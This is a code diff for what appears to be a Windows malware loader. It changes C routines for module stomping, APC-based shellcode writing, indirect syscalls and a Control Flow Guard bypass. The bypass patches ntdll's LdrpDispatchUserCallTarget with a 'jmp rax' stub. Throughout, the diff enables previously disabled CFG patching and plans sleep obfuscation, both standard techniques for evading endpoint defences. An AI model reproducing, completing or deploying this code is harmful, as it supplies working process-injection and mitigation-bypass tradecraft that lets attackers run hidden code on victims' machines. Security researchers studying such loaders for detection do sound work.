@@ -1,9 +1,5 @@
 // Module stomping (CFG bypass) & Heap encryption
-// TODO: Change CFG bypass
-
-// CFG flow -> fcn.LdrpDispatchUserCallTarget -> jmp fcn.LdrpHandleInvalidUserCallTarget -> int 29
-//                      ^
-//                  PATCH THIS -- the JMP (how? https://github.com/SECFORCE/DLL-Hollow-PoC/blob/main/process_injection_dll_hollow_syscalls/src/dllHollow.c)
+// TODO: Sleep obfuscation
 
 #include <windows.h>
 #include <tlhelp32.h>
@@ -38,12 +34,17 @@ typedef struct PE_MODULE {
     PIMAGE_SECTION_HEADER textSection;
 } PE_MODULE;
 
-char AsmPatchCFG[] = {
-    0x90, 0x90, // nop x2 
+char CFGPatch[] = {
+    0xff, 0xe0, // jmp rax
+    0x90, 0x90, 0x90
 };
 
-char instructionsToPatch[] = {
-    0xCD, 0x29 // int 29 
+char LdrpDispatchUserCallTarget[] = {
+    0x49, 0xC1, 0xEA, 0x09 // shr r10, 9
+};
+
+char CFGToPatch[] = {
+    0xE9 // JMP (addr) ??
 };
 
 LPVOID RtlMoveMemoryAPC(HANDLE hproc, HANDLE hthread, PVOID dest, PVOID data, SIZE_T dataLen) {
@@ -225,26 +226,35 @@ WINBOOL ModuleStomping(
         return FALSE;
     }
 
-    // [ Patch CFG ]
-
+    // [ CFG: Search for addr to patch ]
     LPVOID CFGAddrToPatch;
 
-    LPVOID pStackOverrunPf = GetProcAddress(GetModuleHandleA("ntdll"), "__chkstk");
+    {
+        LPVOID pRtlRetrieveNtUserPfn = GetProcAddress(GetModuleHandleA("ntdll"), "RtlRetrieveNtUserPfn");
 
-    CFGAddrToPatch = getPattern(
-        instructionsToPatch,
-        sizeof(instructionsToPatch),
-        0,
-        pStackOverrunPf,
-        0xfff
-    );
+        // Search function
+        LPVOID pLdrpDispatchUserCallTarget = getPattern(
+            LdrpDispatchUserCallTarget,
+            sizeof(LdrpDispatchUserCallTarget),
+            0,
+            pRtlRetrieveNtUserPfn,
+            0xfff
+        );
 
-    if (CFGAddrToPatch  == 0) {
-        DEBUG_LHERROR("getPattern", "Pattern not found", CFGAddrToPatch)
-        return FALSE;
-    } 
-    
-	DEBUG_INFO("Found pattern @ 0x%p\n", CFGAddrToPatch);
+        if (pLdrpDispatchUserCallTarget == 0) {
+            DEBUG_LHERROR("getPattern", "Pattern not found", pLdrpDispatchUserCallTarget)
+            return FALSE;
+        } 
+
+        // Search single instruction
+        CFGAddrToPatch = getPattern(
+            CFGToPatch,
+            sizeof(CFGToPatch),
+            0,
+            pLdrpDispatchUserCallTarget,
+            0xfff
+        );
+    }
 
     // [ Get a alloc addr ]
 
@@ -271,7 +281,7 @@ WINBOOL ModuleStomping(
     }
 
     tempAllocValues.ptr = CFGAddrToPatch;
-    tempAllocValues.size = sizeof(AsmPatchCFG);
+    tempAllocValues.size = sizeof(CFGPatch);
     CallAde(sinner, "NtProtectVirtualMemory", status,
         hproc,
         &tempAllocValues.ptr,
@@ -281,11 +291,9 @@ WINBOOL ModuleStomping(
     )
 
     if (status != 0x0) {
-        DEBUG_HERROR("VirtualProtectEx", "(CFG: RWX)", status)
+        DEBUG_HERROR("VirtualProtectEx", "(CFG Patch: RWX)", status)
         return FALSE;
     }
-
-    DEBUG_INFO("CFG: 0x%p\nShellcode: 0x%p", CFGAddrToPatch, ptrEntryShellcode)
 
     // Add a suspended thread for init the execution chain
 
@@ -309,13 +317,13 @@ WINBOOL ModuleStomping(
         sizeShellcode
     );
 
-    /* RtlMoveMemoryAPC( */
-    /*     hproc, */
-    /*     hthread, */
-    /*     CFGAddrToPatch, */
-    /*     AsmPatchCFG, */
-    /*     sizeof(AsmPatchCFG) */
-    /* ); */
+    RtlMoveMemoryAPC(
+        hproc,
+        hthread,
+        CFGAddrToPatch,
+        CFGPatch,
+        sizeof(CFGPatch)
+    );
 
     ResumeThread(hthread);
     WaitForSingleObject(hthread, INFINITE);
@@ -338,7 +346,7 @@ WINBOOL ModuleStomping(
     }
 
     tempAllocValues.ptr = CFGAddrToPatch;
-    tempAllocValues.size = sizeof(AsmPatchCFG);
+    tempAllocValues.size = sizeof(CFGPatch);
     CallAde(sinner, "NtProtectVirtualMemory", status,
         hproc,
         &tempAllocValues.ptr,
@@ -348,13 +356,13 @@ WINBOOL ModuleStomping(
     )
 
     if (status != 0x0) {
-        DEBUG_HERROR("VirtualProtectEx", "(CFG: RX)", status)
+        DEBUG_HERROR("VirtualProtectEx", "(CFG Patch: RX)", status)
         return FALSE;
     }
 
     // [ END ]
 
-    moduleStompingOut->trampolineAddr    = ptrEntryShellcode;
+    moduleStompingOut->executionAddr = ptrEntryShellcode;
 
     return TRUE;
 }
